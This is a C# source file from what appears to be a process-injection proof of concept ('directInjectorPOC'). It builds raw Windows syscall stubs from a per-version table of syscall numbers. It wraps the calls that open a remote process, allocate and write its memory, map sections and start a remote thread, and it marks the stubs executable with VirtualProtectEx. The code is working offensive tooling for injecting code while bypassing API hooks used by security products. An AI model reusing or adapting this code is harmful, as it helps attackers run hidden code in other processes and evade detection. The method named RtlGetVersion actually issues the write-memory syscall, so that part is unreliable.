using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security;
using System.Collections;
using static directInjectorPOC.nativeStructs;
using System.Collections.Generic;

namespace directInjectorPOC
{
    class syscalls
    {


        public static byte[] syscallSkeleton = { 0x49, 0x89, 0xCA, 0xB8, 0xFF, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };
        public static Dictionary<string, Dictionary<string, byte>> sysDic = new Dictionary<string, Dictionary<string, byte>>()
        {
            { "win10-1507", new Dictionary<string, byte>()
                {
                    { "openprocess",0x26},
                    { "allocatevirtualmem", 0x18},
                    { "writevirtualmem", 0x3A},
                    { "createremthread", 0xB3},
                    { "createsection", 0x4A },
                    { "mapviewofsec", 0x28 }
                }
            },
            { "win10-1511", new Dictionary<string, byte>()
                {
                    { "openprocess",0x26},
                    { "allocatevirtualmem", 0x18},
                    { "writevirtualmem", 0x3A},
                    { "createremthread", 0xB4},
                    { "mapviewofsec", 0x28 }
                }
            },
            { "win10-1607", new Dictionary<string, byte>()
                {
                    { "openprocess",0x26},
                    { "allocatevirtualmem", 0x18},
                    { "writevirtualmem", 0x3A},
                    { "createremthread", 0xB6},
                    { "createsection", 0x4A },
                    { "mapviewofsec", 0x28 }
                }
            },
            { "win10-1703", new Dictionary<string, byte>()
                {
                    { "openprocess",0x26},
                    { "allocatevirtualmem", 0x18},
                    { "writevirtualmem", 0x3A},
                    { "createremthread", 0xB9},
                    { "createsection", 0x4A },
                    { "mapviewofsec", 0x28 }
                }
            },
            { "win10-1709", new Dictionary<string, byte>()
                {
                    { "openprocess",0x26},
                    { "allocatevirtualmem", 0x18},
                    { "writevirtualmem", 0x3A},
                    { "createremthread", 0xBA},
                    { "createsection", 0x4A },
                    { "mapviewofsec", 0x28 }
                }
            },
            { "win10-1803", new Dictionary<string, byte>()
                {
                    { "openprocess",0x26},
                    { "allocatevirtualmem", 0x18},
                    { "writevirtualmem", 0x3A},
                    { "createremthread", 0xBB},
                    { "createsection", 0x4A },
                    { "mapviewofsec", 0x28 }
                }
            },
            { "win10-1809", new Dictionary<string, byte>()
                {
                    { "openprocess",0x26},
                    { "allocatevirtualmem", 0x18},
                    { "writevirtualmem", 0x3A},
                    { "createremthread", 0xBC},
                    { "createsection", 0x4A },
                    { "mapviewofsec", 0x28 }
                }
            },
            { "win10-1903-9", new Dictionary<string, byte>()
                {
                    { "openprocess",0x26},
                    { "allocatevirtualmem", 0x18},
                    { "writevirtualmem", 0x3A},
                    { "createremthread", 0xBD},
                    { "createsection", 0x4A },
                    { "mapviewofsec", 0x28 }
                }
            },
            { "win8-12", new Dictionary<string, byte>()
                {
                    { "openprocess",0x24},
                    { "allocatevirtualmem", 0x16},
                    { "writevirtualmem", 0x38},
                    { "createremthread", 0xAF},
                    { "createsection", 0x48 },
                    { "mapviewofsec", 0x26 }
                }
            },
            { "win8.1-12r2", new Dictionary<string, byte>()
                {
                    { "openprocess",0x25},
                    { "allocatevirtualmem", 0x17},
                    { "writevirtualmem", 0x39},
                    { "createremthread", 0xB0},
                    { "createsection", 0x49 },
                    { "mapviewofsec", 0x27 }
                }
            },
            { "w7-08", new Dictionary<string, byte>()
                {
                    { "openprocess",0x23},
                    { "allocatevirtualmem", 0x15},
                    { "writevirtualmem", 0x37},
                    { "createremthread", 0xA5},
                    { "createsection", 0x47 },
                    { "mapviewofsec", 0x25 }
                }
            }
        };

        public static NTSTATUS ZwOpenProcess(ref IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid, string os)
        {
            byte[] syscall = syscallSkeleton;
            syscall[4] = sysDic[os]["openprocess"];

            unsafe
            {
                fixed (byte* ptr = syscall)
                {

                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,
                        (UIntPtr)syscall.Length, 0x40, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.ZwOpenProcess myAssemblyFunction = (Delegates.ZwOpenProcess)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwOpenProcess));

                    return (NTSTATUS)myAssemblyFunction(out hProcess, processAccess, objAttribute, ref clientid);
                }
            }
        }

        public static NTSTATUS NtCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr lpStartAddress, IntPtr lpParameter, int createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr lpBytesBuffer, string os)
        {
            byte[] syscall = syscallSkeleton;
            syscall[4] = sysDic[os]["createremthread"];

            unsafe
            {
                fixed (byte* ptr = syscall)
                {

                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,
                        (UIntPtr)syscall.Length, 0x40, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }
                    ////
                    ////


                    Delegates.NtCreateThreadEx myAssemblyFunction = (Delegates.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtCreateThreadEx));

                    return (NTSTATUS)myAssemblyFunction(out threadHandle, desiredAccess, objectAttributes, processHandle, lpStartAddress, lpParameter, createSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, lpBytesBuffer);
                }
            }
        }

        public static NTSTATUS ZwWriteVirtualMemory(IntPtr hProcess, ref IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten, string os)
        {
            byte[] syscall = syscallSkeleton;
            syscall[4] = sysDic[os]["writevirtualmem"];

            unsafe
            {
                fixed (byte* ptr = syscall)
                {

                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,
                        (UIntPtr)syscall.Length, 0x40, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.ZwWriteVirtualMemory myAssemblyFunction = (Delegates.ZwWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwWriteVirtualMemory));

                    return (NTSTATUS)myAssemblyFunction(hProcess, lpBaseAddress, lpBuffer, nSize, ref lpNumberOfBytesWritten);
                }
            }
        }


        public static NTSTATUS NtAllocateVirtualMemory(IntPtr hProcess, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect, string os)
        {
            byte[] syscall = syscallSkeleton;
            syscall[4] = sysDic[os]["allocatevirtualmem"];

            unsafe
            {
                fixed (byte* ptr = syscall)
                {

                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,
                        (UIntPtr)syscall.Length, 0x40, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.NtAllocateVirtualMemory myAssemblyFunction = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtAllocateVirtualMemory));

                    return (NTSTATUS)myAssemblyFunction(hProcess, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
                }
            }
        }

        public static NTSTATUS NtCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile, string os)
        {
            byte[] syscall = syscallSkeleton;
            syscall[4] = sysDic[os]["createsection"];

            unsafe
            {
                fixed (byte* ptr = syscall)
                {

                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,
                        (UIntPtr)syscall.Length, 0x40, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.NtCreateSection myAssemblyFunction = (Delegates.NtCreateSection)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtCreateSection));

                    return (NTSTATUS)myAssemblyFunction(ref section, desiredAccess, pAttrs, ref pMaxSize, pageProt, allocationAttribs, hFile);
                }
            }
        }

        public static NTSTATUS NtMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot, string os)
        {
            byte[] syscall = syscallSkeleton;
            syscall[4] = sysDic[os]["mapviewofsec"];

            unsafe
            {
                fixed (byte* ptr = syscall)
                {

                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,
                        (UIntPtr)syscall.Length, 0x40, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.NtMapViewOfSection myAssemblyFunction = (Delegates.NtMapViewOfSection)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtMapViewOfSection));

                    return (NTSTATUS)myAssemblyFunction(section, process, ref baseAddr, zeroBits, commitSize, stuff, ref viewSize, inheritDispo, alloctype, prot);
                }
            }
        }

        public static NTSTATUS RtlGetVersion(IntPtr hProcess, ref IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten, string os)
        {
            byte[] syscall = syscallSkeleton;
            syscall[4] = sysDic[os]["writevirtualmem"];

            unsafe
            {
                fixed (byte* ptr = syscall)
                {

                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,
                        (UIntPtr)syscall.Length, 0x40, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.ZwWriteVirtualMemory myAssemblyFunction = (Delegates.ZwWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwWriteVirtualMemory));

                    return (NTSTATUS)myAssemblyFunction(hProcess, lpBaseAddress, lpBuffer, nSize, ref lpNumberOfBytesWritten);
                }
            }
        }


        public struct Delegates
        {
            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int ZwOpenProcess(out IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int ZwWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int NtCreateThreadEx(out IntPtr threadHandle,uint desiredAccess,IntPtr objectAttributes,IntPtr processHandle,IntPtr lpStartAddress,IntPtr lpParameter,int createSuspended,uint stackZeroBits,uint sizeOfStackCommit,uint sizeOfStackReserve,IntPtr lpBytesBuffer);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool RtlGetVersion(ref OSVERSIONINFOEXW lpVersionInformation);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int NtCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int NtMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);




        }
    }
}
